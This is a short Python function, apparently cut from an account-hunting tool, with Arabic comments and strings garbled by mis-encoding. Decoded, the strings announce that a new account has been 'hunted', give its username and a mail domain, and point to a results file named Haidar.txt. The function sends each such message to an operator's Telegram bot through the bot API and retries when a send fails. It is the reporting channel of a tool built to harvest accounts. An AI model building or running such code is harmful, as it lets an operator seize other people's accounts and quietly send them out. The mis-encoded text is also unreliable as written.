def send_to_telegram(message_text):
    try:
        # ØªØ¬Ø²Ø¦Ø© Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø·ÙˆÙŠÙ„Ø© Ø¬Ø¯Ù‹Ø§
        if len(message_text) > 4000:
            # Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù…Ø®ØªØµØ±Ø©
            username = message_text.split("ÙŠÙˆØ² Ø­Ø³Ø§Ø¨ : ")[1].split("\n")[0] if "ÙŠÙˆØ² Ø­Ø³Ø§Ø¨ : " in message_text else "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"
            domain = message_text.split("Ø¬Ù…ÙŠÙ„ : ")[1].split("\n")[0] if "Ø¬Ù…ÙŠÙ„ : " in message_text else "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"
            simple_message = f"ØªÙ… Ø§ØµØ·ÙŠØ§Ø¯ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯: {username}@{domain}\nØ±Ø§Ø¬Ø¹ Ù…Ù„Ù Haidar.txt Ù„Ù„ØªÙØ§ØµÙŠÙ„ Ø§Ù„ÙƒØ§Ù…Ù„Ø©"
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={simple_message}"
        else:
            # ØªØ´ÙÙŠØ± Ø§Ù„Ù†Øµ Ù„ØªØ¬Ù†Ø¨ Ù…Ø´Ø§ÙƒÙ„ Ø§Ù„Ø£Ø­Ø±Ù Ø§Ù„Ø®Ø§ØµØ©
            encoded_message = requests.utils.quote(message_text)
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={encoded_message}"
        
        response = requests.get(url, timeout=10)
        
        if response.status_code != 200:
            print(f"ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø©: {response.text}")
            # Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø£Ø¨Ø³Ø· ÙÙŠ Ø­Ø§Ù„Ø© Ø§Ù„ÙØ´Ù„
            simple_message = "ØªÙ… Ø§ØµØ·ÙŠØ§Ø¯ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯ - Ø±Ø§Ø¬Ø¹ Ù…Ù„Ù Haidar.txt"
            simple_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={simple_message}"
            requests.get(simple_url, timeout=10)
            
        return True
    except Exception as e:
        print(f"Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø©: {str(e)}")
        return False

